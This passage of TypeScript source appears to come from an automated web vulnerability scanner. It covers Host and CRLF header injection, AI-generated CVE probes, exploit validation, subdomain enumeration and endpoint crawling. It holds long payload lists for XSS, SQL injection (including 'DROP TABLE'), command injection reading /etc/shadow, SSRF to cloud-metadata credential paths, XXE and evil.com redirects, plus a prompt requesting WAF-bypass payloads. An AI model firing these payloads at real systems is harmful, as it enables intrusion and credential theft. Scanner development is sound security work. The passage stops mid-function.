        id: `DOM-XSS-PM-${Date.now()}`, severity: 'high',
        title: 'postMessage Handler with Dangerous Sink',
        description: 'Message event listener found with innerHTML/eval sink.',
        endpoint: url, owasp: 'A03:2021', cwe: 'CWE-79', cvss: 6.1,
        evidence: 'addEventListener("message") + innerHTML/eval', evidence2: 'Source-sink flow detected',
        dualConfirmed: false, remediation: 'Validate message origin and sanitize data.',
        confidence: 70, category: 'dom_xss',
      });
    }
  };

  analyzeHTML(baseHTML, target.toString());
  analyzed.add(target.toString());

  // Analyze JS files for source/sink patterns
  const jsUrls = baseHTML.match(/src=["']([^"']*\.js[^"']*)/gi) || [];
  for (const jsMatch of jsUrls.slice(0, 8)) {
    if (isPhaseExpired('dom_xss', phaseStart, scanStart)) break;
    const jsUrl = jsMatch.replace(/^src=["']/i, '').replace(/["']$/, '');
    try {
      const fullJsUrl = new URL(jsUrl, target).toString();
      if (analyzed.has(fullJsUrl)) continue;
      analyzed.add(fullJsUrl);
      const resp = await fetchWithTimeout(fullJsUrl, 4000);
      if (resp.ok) analyzeHTML(await resp.text(), fullJsUrl);
    } catch {}
  }

  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// HEADER INJECTION TESTING (NEW in v11)
// ═══════════════════════════════════════════════════════════════════════════════
async function testHeaderInjection(target: URL, endpoints: string[], phaseStart: number, scanStart: number): Promise<Finding[]> {
  const findings: Finding[] = [];
  const testEndpoints = endpoints.slice(0, 15);

  for (const ep of testEndpoints) {
    if (isPhaseExpired('header_injection', phaseStart, scanStart)) break;

    // Host header injection
    try {
      const resp = await fetchWithTimeout(ep, 5000, {
        headers: { 'Host': 'evil.com', 'X-Forwarded-Host': 'evil.com' }
      });
      const body = await resp.text();
      if (body.includes('evil.com') && !ep.includes('evil.com')) {
        findings.push({
          id: `HDR-HOST-${Date.now()}`, severity: 'high',
          title: 'Host Header Injection', description: 'Application reflects injected Host header.',
          endpoint: ep, method: 'GET', payload: 'Host: evil.com',
          owasp: 'A03:2021', cwe: 'CWE-74', cvss: 8.1,
          evidence: 'Host: evil.com reflected in response body',
          evidence2: `Response contains "evil.com"`,
          dualConfirmed: true, exploitValidated: true,
          remediation: 'Validate Host header against allowed values.',
          confidence: 92, category: 'injection',
          poc: `curl -sH "Host: evil.com" "${ep}" | grep -i evil`
        });
      }
    } catch {}

    // X-Forwarded-For bypass
    try {
      const resp1 = await fetchWithTimeout(ep, 5000);
      const resp2 = await fetchWithTimeout(ep, 5000, {
        headers: { 'X-Forwarded-For': '127.0.0.1', 'X-Real-IP': '127.0.0.1', 'X-Originating-IP': '127.0.0.1' }
      });
      if (resp1.status === 403 && resp2.status === 200) {
        findings.push({
          id: `HDR-XFF-${Date.now()}`, severity: 'high',
          title: 'IP Restriction Bypass via X-Forwarded-For',
          description: 'Access control bypassed using X-Forwarded-For: 127.0.0.1.',
          endpoint: ep, method: 'GET', payload: 'X-Forwarded-For: 127.0.0.1',
          owasp: 'A01:2021', cwe: 'CWE-290', cvss: 8.6,
          evidence: `Without header: ${resp1.status}, With header: ${resp2.status}`,
          evidence2: 'IP-based access control bypassed',
          dualConfirmed: true, exploitValidated: true,
          remediation: 'Do not trust X-Forwarded-For for access control.',
          confidence: 95, category: 'access_control',
          poc: `# Without bypass:\ncurl -sI "${ep}"\n# With bypass:\ncurl -sH "X-Forwarded-For: 127.0.0.1" "${ep}"`
        });
      }
    } catch {}

    // CRLF injection in headers
    try {
      const crlfUrl = `${ep}${ep.includes('?') ? '&' : '?'}test=%0d%0aInjected-Header:true`;
      const resp = await fetchWithTimeout(crlfUrl, 5000);
      const injHeader = resp.headers.get('injected-header');
      if (injHeader === 'true') {
        findings.push({
          id: `HDR-CRLF-${Date.now()}`, severity: 'critical',
          title: 'CRLF Injection / HTTP Response Splitting',
          description: 'Arbitrary headers can be injected via CRLF.',
          endpoint: crlfUrl, method: 'GET', payload: '%0d%0aInjected-Header:true',
          owasp: 'A03:2021', cwe: 'CWE-113', cvss: 9.1,
          evidence: 'Injected-Header: true present in response',
          dualConfirmed: true, exploitValidated: true,
          remediation: 'Sanitize CRLF characters from user input.',
          confidence: 98, category: 'injection',
          poc: `curl -sI "${crlfUrl}" | grep -i injected`
        });
      }
    } catch {}
  }
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// HACKTIVITY PATTERN LEARNING (NEW in v11)
// ═══════════════════════════════════════════════════════════════════════════════
async function fetchHacktivityPatterns(apiKey: string | undefined, technologies: string[]): Promise<any[]> {
  if (!apiKey || technologies.length === 0) return [];
  try {
    const resp = await fetch("https://ai.gateway.lovable.dev/v1/chat/completions", {
      method: "POST",
      headers: { Authorization: `Bearer ${apiKey}`, "Content-Type": "application/json" },
      body: JSON.stringify({
        model: "google/gemini-2.5-flash",
        messages: [
          { role: "system", content: "You are a bug bounty intelligence analyst. Based on the tech stack, provide the TOP 10 most commonly reported vulnerability patterns from HackerOne/Bugcrowd hacktivity. Return JSON only." },
          { role: "user", content: `Tech stack: ${technologies.join(', ')}\n\nReturn: {"patterns":[{"type":"sqli|xss|ssrf|idor|rce|lfi|cors|csrf|auth_bypass|info_disclosure","param_names":["..."],"endpoints":["..."],"payload_hint":"...","priority":1-10}]}` }
        ],
        temperature: 0.3, max_tokens: 1500,
      }),
    });
    if (resp.ok) {
      const data = await resp.json();
      const content = data.choices?.[0]?.message?.content || '';
      const jsonMatch = content.match(/\{[\s\S]*\}/);
      if (jsonMatch) {
        const result = JSON.parse(jsonMatch[0]);
        return result.patterns || [];
      }
    }
  } catch {}
  return [];
}

// ═══════════════════════════════════════════════════════════════════════════════
// CVE EXPLOIT TESTING
// ═══════════════════════════════════════════════════════════════════════════════
async function testCVEExploits(target: URL, cves: any[], technologies: string[], apiKey: string | undefined, phaseStart: number, scanStart: number): Promise<Finding[]> {
  const findings: Finding[] = [];
  if (!apiKey || cves.length === 0) return findings;

  try {
    const resp = await fetch("https://ai.gateway.lovable.dev/v1/chat/completions", {
      method: "POST",
      headers: { Authorization: `Bearer ${apiKey}`, "Content-Type": "application/json" },
      body: JSON.stringify({
        model: "google/gemini-2.5-flash",
        messages: [
          { role: "system", content: "Expert pentester. Generate safe detection payloads for CVEs. Return JSON only." },
          { role: "user", content: `Target: ${target.hostname}\nTech: ${technologies.join(', ')}\nCVEs: ${JSON.stringify(cves.slice(0, 10).map(c => ({ id: c.id, desc: c.description?.slice(0, 100), tech: c.technology })))}\n\nReturn: {"exploits":[{"cve_id":"...","path":"...","method":"GET|POST","payload":"...","detection_pattern":"...","description":"..."}]}` }
        ],
        temperature: 0.2, max_tokens: 2000,
      }),
    });
    if (!resp.ok) return findings;
    const data = await resp.json();
    const content = data.choices?.[0]?.message?.content || '';
    const jsonMatch = content.match(/\{[\s\S]*\}/);
    if (!jsonMatch) return findings;
    const result = JSON.parse(jsonMatch[0]);

    for (const exploit of (result.exploits || [])) {
      if (isPhaseExpired('cve_exploit', phaseStart, scanStart)) break;
      try {
        const testUrl = new URL(exploit.path || '/', target).toString();
        const resp = await fetchWithTimeout(testUrl, 8000, {
          method: exploit.method || 'GET',
          ...(exploit.payload && exploit.method === 'POST' ? { body: exploit.payload, headers: { 'Content-Type': 'application/x-www-form-urlencoded' } } : {})
        });
        const body = await resp.text();
        if (exploit.detection_pattern && body.toLowerCase().includes(exploit.detection_pattern.toLowerCase())) {
          const cve = cves.find(c => c.id === exploit.cve_id);
          findings.push({
            id: `CVE-${exploit.cve_id}-${Date.now()}`, severity: cve?.severity === 'CRITICAL' ? 'critical' : 'high',
            title: `${exploit.cve_id} Confirmed`,
            description: `${exploit.description || cve?.description || 'CVE detected'} (Score: ${cve?.score || 'N/A'})`,
            endpoint: testUrl, method: exploit.method || 'GET', payload: exploit.payload,
            owasp: 'A06:2021', cwe: 'CWE-1104', cvss: cve?.score || 7.5,
            evidence: `Detection pattern "${exploit.detection_pattern}" found`,
            evidence2: `CVE: ${exploit.cve_id}, Tech: ${cve?.technology}`,
            dualConfirmed: true, exploitValidated: true,
            remediation: `Patch ${cve?.technology || 'component'}. Ref: https://nvd.nist.gov/vuln/detail/${exploit.cve_id}`,
            confidence: 90, category: 'cve',
            poc: `# CVE: ${exploit.cve_id}\ncurl -X ${exploit.method || 'GET'} "${testUrl}"${exploit.payload ? ` -d "${exploit.payload}"` : ''}\n# Look for: ${exploit.detection_pattern}`
          });
        }
      } catch {}
    }
  } catch (e) { console.log('CVE testing error:', e); }
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// DETERMINISTIC EXPLOIT VALIDATION
// ═══════════════════════════════════════════════════════════════════════════════
async function deterministicExploitValidation(findings: Finding[], target: URL, phaseStart: number, scanStart: number): Promise<Finding[]> {
  for (const finding of findings) {
    if (isPhaseExpired('exploit_validation', phaseStart, scanStart)) break;
    if (finding.exploitValidated) continue;
    if (['low', 'info'].includes(finding.severity)) { finding.exploitValidated = finding.dualConfirmed || false; continue; }

    try {
      switch (finding.category) {
        case 'injection': {
          if (finding.payload && finding.endpoint) {
            const resp = await fetchWithTimeout(finding.endpoint, 8000);
            const body = await resp.text();
            if (finding.cwe === 'CWE-89') {
              const sqlErrors = ['sql syntax', 'mysql_fetch', 'pg_query', 'sqlite', 'ora-', 'you have an error', 'sqlstate', 'unclosed quotation'];
              finding.exploitValidated = sqlErrors.some(e => body.toLowerCase().includes(e));
            } else if (finding.cwe === 'CWE-79') {
              finding.exploitValidated = body.includes(finding.payload) || body.includes('onerror=') || body.includes('onload=');
            } else {
              finding.exploitValidated = finding.dualConfirmed || false;
            }
          }
          break;
        }
        case 'cors': {
          const resp = await fetchWithTimeout(finding.endpoint, 6000, { headers: { 'Origin': 'https://evil.com' } });
          const acao = resp.headers.get('access-control-allow-origin');
          finding.exploitValidated = acao === 'https://evil.com' || acao === '*';
          break;
        }
        case 'traversal': {
          const resp = await fetchWithTimeout(finding.endpoint, 6000);
          const body = await resp.text();
          finding.exploitValidated = body.includes('root:x:0:0') || body.includes('/bin/bash') || body.includes('[extensions]');
          break;
        }
        case 'takeover': { finding.exploitValidated = finding.dualConfirmed || false; break; }
        case 'access_control': { const resp = await fetchWithTimeout(finding.endpoint, 6000); finding.exploitValidated = resp.status === 200; break; }
        default: finding.exploitValidated = finding.dualConfirmed || finding.confidence >= 90;
      }
    } catch { finding.exploitValidated = finding.dualConfirmed || false; }

    if (!finding.exploitValidated && ['critical', 'high'].includes(finding.severity) && !finding.dualConfirmed) {
      finding.falsePositive = true;
    }
  }
  return findings.filter(f => !f.falsePositive);
}

// ═══════════════════════════════════════════════════════════════════════════════
// AI FALSE POSITIVE FILTER
// ═══════════════════════════════════════════════════════════════════════════════
async function aiFalsePositiveFilter(findings: Finding[], apiKey: string | undefined, fingerprint: any): Promise<Finding[]> {
  if (!apiKey || findings.length === 0) return findings;
  const toFilter = findings.filter(f => ['critical', 'high', 'medium'].includes(f.severity));
  const passThrough = findings.filter(f => !['critical', 'high', 'medium'].includes(f.severity));
  if (toFilter.length === 0) return findings;

  try {
    const resp = await fetch("https://ai.gateway.lovable.dev/v1/chat/completions", {
      method: "POST",
      headers: { Authorization: `Bearer ${apiKey}`, "Content-Type": "application/json" },
      body: JSON.stringify({
        model: "google/gemini-2.5-flash",
        messages: [
          { role: "system", content: "Expert bug bounty triager. Analyze findings. Return JSON array of finding IDs that are REAL exploitable vulnerabilities. Consider: evidence quality, tech plausibility, exploit validation status, dual confirmation." },
          { role: "user", content: `Tech: ${(fingerprint.technologies || []).join(', ')}\nServer: ${fingerprint.server || 'unknown'}\n\nFindings:\n${JSON.stringify(toFilter.map(f => ({ id: f.id, title: f.title, evidence: f.evidence, evidence2: f.evidence2, confidence: f.confidence, dualConfirmed: f.dualConfirmed, exploitValidated: f.exploitValidated, category: f.category })), null, 1)}\n\nReturn: {"valid_ids":["id1","id2",...]}` }
        ],
        temperature: 0.1
      }),
    });
    if (resp.ok) {
      const data = await resp.json();
      const content = data.choices?.[0]?.message?.content || '';
      const jsonMatch = content.match(/\{[\s\S]*\}/);
      if (jsonMatch) {
        const result = JSON.parse(jsonMatch[0]);
        const validIds = new Set(result.valid_ids || []);
        const filtered = toFilter.filter(f => validIds.has(f.id) || f.dualConfirmed || f.exploitValidated || f.confidence >= 95);
        toFilter.filter(f => !validIds.has(f.id) && !f.dualConfirmed && !f.exploitValidated && f.confidence < 95)
          .forEach(f => { f.falsePositive = true; });
        return [...filtered, ...passThrough];
      }
    }
  } catch (e) { console.log('AI FP filter failed:', e); }
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// CVE INTELLIGENCE
// ═══════════════════════════════════════════════════════════════════════════════
async function fetchLatestCVEs(technologies: string[], server: string | null): Promise<any[]> {
  const cves: any[] = [];
  const keywords = [...technologies];
  if (server) keywords.push(server.split('/')[0]);

  for (const keyword of keywords.slice(0, 5)) {
    try {
      const resp = await fetchWithTimeout(
        `https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=${encodeURIComponent(keyword)}&resultsPerPage=5`, 10000
      );
      if (resp.ok) {
        const data = await resp.json();
        for (const vuln of (data.vulnerabilities || []).slice(0, 5)) {
          const cve = vuln.cve;
          cves.push({
            id: cve.id,
            description: cve.descriptions?.find((d: any) => d.lang === 'en')?.value?.slice(0, 200) || '',
            severity: cve.metrics?.cvssMetricV31?.[0]?.cvssData?.baseSeverity || 'UNKNOWN',
            score: cve.metrics?.cvssMetricV31?.[0]?.cvssData?.baseScore || 0,
            technology: keyword, published: cve.published
          });
        }
      }
    } catch {}
  }
  return cves;
}

// ═══════════════════════════════════════════════════════════════════════════════
// AI OWASP PAYLOAD GENERATION
// ═══════════════════════════════════════════════════════════════════════════════
async function generateOwaspPayloads(
  apiKey: string | undefined, technologies: string[], ports: number[],
  fingerprint: any, failedPayloads: string[], cves: any[], pastSuccesses: any[],
  hacktivityPatterns: any[]
): Promise<Record<string, string[]>> {
  const defaultPayloads: Record<string, string[]> = {
    a01_access: ['../../../etc/passwd', '..\\..\\..\\windows\\win.ini', '/admin', '/api/admin/users', '/user/1', '/user/2'],
    a02_crypto: ['http://'],
    a03_xss: [
      '"><img src=x onerror=alert(1)>', '<svg/onload=alert(document.domain)>', "'-alert(1)-'",
      '<script>alert(1)</script>', '"><svg/onload=confirm(1)>', '{{7*7}}', '${7*7}',
      '<img src=x onerror=prompt(1)>', '"><body onload=alert(1)>', 'javascript:alert(1)//',
      '<details open ontoggle=alert(1)>', '"><marquee onstart=alert(1)>',
      "';alert(String.fromCharCode(88,83,83))//", '<iframe src="javascript:alert(1)">',
      '<img/src=x onerror=alert`1`>', '<svg><animate onbegin=alert(1) attributeName=x>',
    ],
    a03_sqli: [
      "'\"", "' OR '1'='1", "1 UNION SELECT NULL--", "1' ORDER BY 1--", "1' AND 1=1--",
      "') OR ('1'='1", "1; DROP TABLE test--", "admin' --", "1' WAITFOR DELAY '0:0:5'--",
      "1 AND SLEEP(5)", "1' AND '1'='1' UNION SELECT username,password FROM users--",
      "' UNION SELECT NULL,NULL,NULL--", "-1 OR 1=1", "1 OR 1=1--",
      "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
      "1;SELECT CASE WHEN(1=1) THEN 1 ELSE 1/0 END--",
      "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
      "1' AND BENCHMARK(5000000,SHA1('test'))--",
    ],
    a03_cmdi: [
      '; id', '| id', '$(id)', '`id`', '; whoami', '| whoami',
      '; uname -a', '| cat /etc/shadow', '$(cat /etc/passwd)',
      '; curl http://127.0.0.1', '%0aid', '\nid', '& whoami', '; env',
      '|| whoami', '& ping -c 1 127.0.0.1 &',
    ],
    a03_nosqli: ['{"$gt":""}', '{"$ne":""}', "' || '1'=='1", '[$ne]=1', '{"$where":"sleep(5000)"}'],
    a04_design: ['transfer_to=attacker', 'amount=-100', 'role=admin', 'isAdmin=true'],
    a05_misconfig: [
      '/.git/config', '/.env', '/phpinfo.php', '/server-status', '/debug', '/.DS_Store',
      '/web.config', '/crossdomain.xml', '/.svn/entries', '/wp-config.php.bak',
      '/config.yml', '/.htpasswd', '/Dockerfile', '/docker-compose.yml',
      '/.well-known/openid-configuration', '/api/swagger.json', '/api/docs',
    ],
    a06_components: [],
    a07_auth: ['admin:admin', 'admin:password', 'root:root', 'test:test', 'admin:123456'],
    a08_integrity: [
      'O:8:"stdClass":0:{}', 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==',
      '{"__proto__":{"polluted":true}}', '{"constructor":{"prototype":{"isAdmin":true}}}',
    ],
    a09_logging: ['%0d%0aInjected-Header:true', '\r\nSet-Cookie:pwned=1', '%0aFake-Log-Entry', '%0d%0aLocation: https://evil.com'],
    a10_ssrf: [
      'http://169.254.169.254/latest/meta-data/',
      'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
      'http://127.0.0.1:80/', 'http://127.0.0.1:8080/', 'file:///etc/passwd',
      'http://[::1]/', 'http://0x7f000001/', 'gopher://127.0.0.1:25/',
      'http://metadata.google.internal/computeMetadata/v1/',
    ],
    a01_redirect: ['//evil.com', 'https://evil.com', '/\\evil.com', '//evil.com/%2f..'],
    a03_xxe: ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'],
  };

  // Prioritize past successes
  for (const success of pastSuccesses) {
    if (success.payload_sent && success.test_type) {
      const key = `a03_${success.test_type}`;
      if (defaultPayloads[key]) defaultPayloads[key].unshift(success.payload_sent);
    }
  }

  // Inject hacktivity pattern hints
  for (const pattern of hacktivityPatterns) {
    if (pattern.payload_hint) {
      const key = `a03_${pattern.type}`;
      if (defaultPayloads[key]) defaultPayloads[key].push(pattern.payload_hint);
    }
  }

  // AI-enhanced
  if (apiKey && technologies.length > 0) {
    try {
      const resp = await fetch("https://ai.gateway.lovable.dev/v1/chat/completions", {
        method: "POST",
        headers: { Authorization: `Bearer ${apiKey}`, "Content-Type": "application/json" },
        body: JSON.stringify({
          model: "google/gemini-2.5-flash",
          messages: [
            { role: "system", content: "Expert pentester generating WAF-bypass payloads for authorized testing. Return valid JSON only, no markdown." },
            { role: "user", content: `Tech: ${technologies.join(', ')}\nPorts: ${ports.join(', ')}\nServer: ${fingerprint.server || 'unknown'}\nBlocked: ${failedPayloads.slice(0, 10).join(', ')}\nCVEs: ${cves.slice(0, 5).map((c: any) => c.id).join(', ')}\n\nGenerate 5 NEW bypass payloads per category. Return: {"a03_xss":[...],"a03_sqli":[...],"a03_cmdi":[...],"a10_ssrf":[...]}` }
          ],
          temperature: 0.7
        }),
      });
      if (resp.ok) {
        const data = await resp.json();
        const content = data.choices?.[0]?.message?.content || '';
        const jsonMatch = content.match(/\{[\s\S]*\}/);
        if (jsonMatch) {
          const aiPayloads = JSON.parse(jsonMatch[0]);
          for (const [key, vals] of Object.entries(aiPayloads)) {
            if (Array.isArray(vals) && defaultPayloads[key]) {
              defaultPayloads[key].push(...vals.filter((v: any) => typeof v === 'string'));
            }
          }
        }
      }
    } catch (e) { console.log('AI payload gen failed:', e); }
  }

  for (const key of Object.keys(defaultPayloads)) {
    defaultPayloads[key] = defaultPayloads[key].filter(p => !failedPayloads.includes(p));
  }
  return defaultPayloads;
}

// ═══════════════════════════════════════════════════════════════════════════════
// SUBDOMAIN ENUMERATION
// ═══════════════════════════════════════════════════════════════════════════════
async function enumerateSubdomains(hostname: string, phaseStart: number, scanStart: number): Promise<string[]> {
  const found = new Set<string>();

  // crt.sh
  try {
    const crtResp = await fetchWithTimeout(`https://crt.sh/?q=%.${hostname}&output=json`, 12000);
    if (crtResp.ok) {
      const crtData = await crtResp.json();
      for (const entry of (crtData || []).slice(0, 500)) {
        for (const name of (entry.name_value?.split('\n') || [])) {
          const clean = name.trim().replace(/^\*\./, '').toLowerCase();
          if (clean.endsWith(hostname) && clean !== hostname && !clean.includes('*')) found.add(clean);
        }
      }
    }
  } catch {}

  const prefixes = [
    'www', 'mail', 'api', 'app', 'admin', 'dev', 'staging', 'test', 'beta',
    'portal', 'login', 'auth', 'shop', 'blog', 'docs', 'support', 'cdn', 'static',
    'media', 'img', 'm', 'mobile', 'dashboard', 'panel', 'vpn', 'remote',
    'secure', 'gateway', 'smtp', 'ftp', 'webmail', 'cp', 'old', 'new', 'v1', 'v2',
    'db', 'mysql', 'redis', 'jenkins', 'gitlab', 'jira', 'wiki', 'status', 'monitor',
    'internal', 'intranet', 'sandbox', 'qa', 'uat', 'prod', 'stage', 'preprod',
    'assets', 'files', 'upload', 'downloads', 'backup', 'bak', 'proxy', 'cache',
    'ns1', 'ns2', 'mx', 'pop', 'imap', 'autodiscover', 'owa', 'exchange',
  ];

  const batchSize = 15;
  for (let i = 0; i < prefixes.length; i += batchSize) {
    if (isPhaseExpired('subdomain_enum', phaseStart, scanStart)) break;
    const batch = prefixes.slice(i, i + batchSize);
    await Promise.all(batch.map(async (prefix) => {
      try {
        const resp = await fetchWithTimeout(`https://dns.google/resolve?name=${encodeURIComponent(`${prefix}.${hostname}`)}&type=A`, 4000);
        if (resp.ok) {
          const data = await resp.json();
          if (data?.Answer?.find((a: any) => a.type === 1)?.data) found.add(`${prefix}.${hostname}`);
        }
      } catch {}
    }));
  }

  // Verify crt.sh subs
  const toVerify = Array.from(found).filter(s => !prefixes.some(p => s.startsWith(p + '.')));
  for (let i = 0; i < toVerify.length; i += batchSize) {
    if (isPhaseExpired('subdomain_enum', phaseStart, scanStart)) break;
    const batch = toVerify.slice(i, i + batchSize);
    await Promise.all(batch.map(async (sub) => {
      try {
        const resp = await fetchWithTimeout(`https://dns.google/resolve?name=${encodeURIComponent(sub)}&type=A`, 4000);
        if (!resp.ok) { found.delete(sub); return; }
        const data = await resp.json();
        if (!data?.Answer?.find((a: any) => a.type === 1)?.data) found.delete(sub);
      } catch { found.delete(sub); }
    }));
  }

  return Array.from(found);
}

// ═══════════════════════════════════════════════════════════════════════════════
// ENDPOINT DISCOVERY (3-level crawl + JS mining)
// ═══════════════════════════════════════════════════════════════════════════════
async function discoverEndpoints(
  target: URL, shodanKey: string | undefined, maxDepth: number,
  phaseStart: number, scanStart: number, baseHTML: string
): Promise<any> {
  const results: any = {
    endpoints: [target.toString()], forms: [], params: [], apiEndpoints: [],
    authEndpoints: [], technologies: [], serverInfo: null, headers: {},
    shodanData: null, ports: [], workflows: [], jsEndpoints: [],
  };

  const extractFromHTML = (html: string, baseUrl: string) => {
    // Links
    const links = html.match(/(?:href|src|action)=["']([^"'#]+)["']/gi) || [];
    for (const match of links) {
      const url = match.replace(/^(?:href|src|action)=["']/i, '').replace(/["']$/, '');
      if (url.startsWith('javascript:') || url.startsWith('mailto:') || url.startsWith('#')) continue;
      try {
        const fullUrl = new URL(url, baseUrl).toString();
        if (fullUrl.includes(target.hostname) && !results.endpoints.includes(fullUrl)) results.endpoints.push(fullUrl);
      } catch {}
    }

    // Forms (including textarea and select)
    const formMatches = html.match(/<form[^>]*>[\s\S]*?<\/form>/gi) || [];
    for (const form of formMatches) {
      const action = form.match(/action=["']([^"']+)["']/i)?.[1] || '';
      const method = form.match(/method=["']([^"']+)["']/i)?.[1] || 'GET';
      const inputs = (form.match(/<(?:input|textarea|select)[^>]+>/gi) || []).map((inp: string) => {
        const name = inp.match(/name=["']([^"']+)["']/i)?.[1];
        const type = inp.match(/type=["']([^"']+)["']/i)?.[1] || 'text';
        return { name, type };
      }).filter((i: any) => i.name);
      if (inputs.length > 0) {
        const resolvedAction = action ? new URL(action, baseUrl).toString() : baseUrl;
        // Add form input names as params too
        for (const inp of inputs) {
          if (inp.name && !results.params.includes(inp.name)) results.params.push(inp.name);
        }
        results.forms.push({ id: results.forms.length, action: resolvedAction, method: method.toUpperCase(), inputs });
      }
    }

    // Params from URLs in the page
    const paramMatches = html.match(/\?[^"'\s><]+/g) || [];
    for (const param of paramMatches) {
      for (const pair of param.slice(1).split('&')) {
        const [key] = pair.split('=');
        if (key && !results.params.includes(key)) results.params.push(key);
      }
    }

    // Hidden inputs outside forms
    const hiddenInputs = html.match(/<input[^>]+type=["']hidden["'][^>]*>/gi) || [];
    for (const inp of hiddenInputs) {
      const name = inp.match(/name=["']([^"']+)["']/i)?.[1];
      if (name && !results.params.includes(name)) results.params.push(name);
    }
  };

  // Parse base HTML
  try {
    const resp = await fetchWithTimeout(target.toString(), 10000);
    const html = baseHTML || await resp.text();
    results.headers = Object.fromEntries(resp.headers.entries());
    results.serverInfo = resp.headers.get('server');

    // Tech detection
    const techPatterns: Record<string, RegExp> = {
      'PHP': /\.php|X-Powered-By:\s*PHP/i, 'WordPress': /wp-content|wp-includes/i,
      'jQuery': /jquery/i, 'Bootstrap': /bootstrap/i, 'React': /react|__NEXT_DATA__/i,
      'Angular': /ng-app|angular/i, 'Vue': /vue\.js|v-bind/i, 'ASP.NET': /asp\.net|__VIEWSTATE/i,
      'Java': /java|jsessionid/i, 'Python': /python|django|flask/i, 'Ruby': /ruby|rails/i,
      'Node.js': /express|node/i, 'Nginx': /nginx/i, 'Apache': /apache/i,
      'IIS': /iis|microsoft/i, 'Laravel': /laravel/i, 'Spring': /spring/i,
    };
    const serverHeader = (results.serverInfo || '').toLowerCase();
    const headerStr = JSON.stringify(results.headers).toLowerCase();
    for (const [tech, pattern] of Object.entries(techPatterns)) {
      if (pattern.test(html) || pattern.test(serverHeader) || pattern.test(headerStr)) {
        if (!results.technologies.includes(tech)) results.technologies.push(tech);
      }
    }

    extractFromHTML(html, target.toString());

    // JS file mining — extract API routes from .js files
    const jsFiles = html.match(/src=["']([^"']*\.js[^"']*)/gi) || [];
    for (const js of jsFiles.slice(0, 15)) {
      if (isPhaseExpired('discovery', phaseStart, scanStart)) break;
      const jsUrl = js.replace(/^src=["']/i, '').replace(/["']$/, '');
      try {
        const fullJsUrl = new URL(jsUrl, target).toString();
        if (!fullJsUrl.includes(target.hostname)) continue;
        const jsResp = await fetchWithTimeout(fullJsUrl, 5000);
        if (!jsResp.ok) continue;
        const jsContent = await jsResp.text();

        // Mine API endpoints from JS
        const apiPatterns = [
          /["'](\/api\/[^"'\s]+)["']/g,
          /["'](\/v[0-9]+\/[^"'\s]+)["']/g,
          /fetch\s*\(\s*["']([^"']+)["']/g,
          /axios\.[a-z]+\s*\(\s*["']([^"']+)["']/g,
          /url:\s*["']([^"']+)["']/g,
          /endpoint:\s*["']([^"']+)["']/g,
          /["'](\/[a-z][a-z0-9_-]*(?:\/[a-z][a-z0-9_-]*){1,5})["']/gi,
        ];
        for (const pattern of apiPatterns) {
          let match;
          while ((match = pattern.exec(jsContent)) !== null) {
            const path = match[1];
            if (path && path.startsWith('/') && path.length > 2 && path.length < 200) {
              try {
                const fullUrl = new URL(path, target).toString();
                if (!results.endpoints.includes(fullUrl)) {
                  results.endpoints.push(fullUrl);
                  results.jsEndpoints.push(fullUrl);
                  if (path.includes('api') || path.includes('graphql')) results.apiEndpoints.push(fullUrl);
                  if (path.includes('login') || path.includes('auth') || path.includes('signin')) results.authEndpoints.push(fullUrl);
                }
              } catch {}
            }
          }
        }

        // Extract param names from JS
        const jsParams = jsContent.match(/(?:param|query|field|name)(?:s)?["':\s]*=?\s*["']([a-zA-Z_][a-zA-Z0-9_]{1,30})["']/gi) || [];
        for (const p of jsParams) {
          const name = p.match(/["']([a-zA-Z_][a-zA-Z0-9_]{1,30})["']/)?.[1];
          if (name && !results.params.includes(name)) results.params.push(name);
        }
      } catch {}
    }
  } catch {}

  // 2nd-level crawl (more pages)
  const level2Links = results.endpoints.filter((ep: string) => ep !== target.toString() && !ep.endsWith('.js')).slice(0, 25);
  for (let i = 0; i < level2Links.length; i += 5) {
    if (isPhaseExpired('discovery', phaseStart, scanStart)) break;
    const batch = level2Links.slice(i, i + 5);
    await Promise.all(batch.map(async (link: string) => {
      try {
        const resp = await fetchWithTimeout(link, 4000);
        if (!resp.ok) return;
        const html2 = await resp.text();
        extractFromHTML(html2, link);
      } catch {}
    }));
  }

  // 3rd-level crawl (deeper!)
  const level3Links = results.endpoints.filter((ep: string) =>
    !level2Links.includes(ep) && ep !== target.toString() && !ep.endsWith('.js') && !ep.endsWith('.css')
  ).slice(0, 10);
  for (let i = 0; i < level3Links.length; i += 5) {
    if (isPhaseExpired('discovery', phaseStart, scanStart)) break;
    const batch = level3Links.slice(i, i + 5);
    await Promise.all(batch.map(async (link: string) => {
      try {
        const resp = await fetchWithTimeout(link, 3000);
        if (!resp.ok) return;
        extractFromHTML(await resp.text(), link);
      } catch {}
    }));
  }

  // Common path discovery
  const commonPaths = [
    '/api', '/api/v1', '/api/v2', '/graphql', '/admin', '/login', '/signin', '/auth', '/register',
    '/dashboard', '/panel', '/swagger', '/api-docs', '/robots.txt', '/sitemap.xml',
    '/wp-admin', '/wp-json', '/wp-login.php', '/phpinfo.php', '/server-status', '/.git/config',
    '/.git/HEAD', '/.env', '/health', '/metrics', '/debug', '/test', '/backup', '/upload',
    '/.svn/entries', '/.DS_Store', '/web.config', '/crossdomain.xml', '/wp-config.php.bak',
    '/.htpasswd', '/config.yml', '/search', '/product', '/user', '/account',
    '/console', '/actuator', '/actuator/env', '/actuator/health', '/elmah.axd',
    '/wp-content/debug.log', '/error_log', '/.well-known/security.txt', '/security.txt',
    '/api/users', '/api/config', '/xmlrpc.php', '/readme.html',
    '/phpmyadmin', '/adminer', '/solr/', '/jenkins/', '/manager/html',
    '/reset', '/forgot', '/password', '/download', '/export',
    '/Dockerfile', '/docker-compose.yml', '/.dockerenv', '/package.json',
    '/composer.json', '/Gemfile', '/requirements.txt', '/go.mod',
  ];

  for (let i = 0; i < commonPaths.length; i += 10) {
    if (isPhaseExpired('discovery', phaseStart, scanStart)) break;
    const batch = commonPaths.slice(i, i + 10);
    await Promise.all(batch.map(async (path) => {
      try {
